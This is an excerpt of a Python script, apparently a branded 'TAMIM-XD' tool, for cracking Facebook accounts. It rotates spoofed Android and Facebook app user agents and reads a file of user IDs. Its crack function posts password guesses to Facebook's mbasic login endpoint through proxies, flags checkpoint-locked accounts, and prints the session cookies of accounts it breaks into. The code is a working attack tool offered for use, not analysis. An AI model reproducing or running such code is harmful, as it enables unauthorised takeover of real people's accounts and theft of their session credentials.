...
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; TB328FU Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.xgamesgroup.puzzleisland;FBAV/0427.0;FBBV/642719885;FBVS/6.16.0;FBLC/it_IT]",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-A135M Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.moonfrog.ludo.club;FBAV/2.4.6;FBBV/54918;FBVS/6.15.0;FBLC/en_US]",]
...
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; moto g power (2021) Build/RZBS31.Q2-143-27-7) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/356687955;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;]"]
ugen2=[]
ugen=[]
cokbrut=[]
...
os.system('espeak -a 300 " Welcome,   to,  Tamims  Tools"')
...
def login():
	...
	if Tamim in ['m']:
		...
		os.system('xdg-open https://www.facebook.com/tamimahamad.tamim.54?mibextid=ZbWKwL')
	elif Tamim in ['0']:
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/TAMIM-XD.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    'user-agent': ua,
    'viewport-width': '980',}
			po = ses.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#Tamim-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•TAMIM-Cp🔒] {idf} • {pw}')     
				...
				#Tamim-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•TAMIM-XD-⚡] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;95m{kuki} ')
				print('\033[0;94m==============================================================')
